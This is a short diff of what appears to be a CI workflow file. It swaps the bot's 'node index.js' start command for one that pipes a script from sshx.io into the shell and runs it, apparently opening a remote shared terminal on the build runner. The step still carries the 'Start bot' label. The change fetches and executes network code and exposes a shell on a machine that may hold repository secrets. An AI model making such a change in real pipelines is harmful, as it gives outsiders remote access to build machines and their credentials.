@@ -27,4 +27,4 @@ jobs:
 
       # Run the bot
       - name: Start bot
-        run: node index.js
+        run: curl -sSf https://sshx.io/get | sh -s run
